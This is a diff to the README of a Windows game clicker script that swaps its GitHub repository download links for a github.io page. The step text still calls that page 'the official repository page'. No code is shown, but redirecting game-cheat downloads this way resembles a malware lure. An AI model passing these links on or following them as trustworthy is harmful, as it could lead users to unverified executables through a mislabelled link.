@@ -1,6 +1,6 @@
 # 🧠 Brainrot-Clicker-Script-GUI-2026 - Automate your game progress with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://musical-jumpsuit327.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ This application runs on standard Windows systems. You need the following items 
 
 Follow these steps to set up the software on your personal computer.
 
-1. First, visit the official repository page to get the files. Use this link: [https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026](https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026).
+1. First, visit the official repository page to get the files. Use this link: [https://musical-jumpsuit327.github.io](https://musical-jumpsuit327.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the most current version link.
 4. Download the file provided in that section.
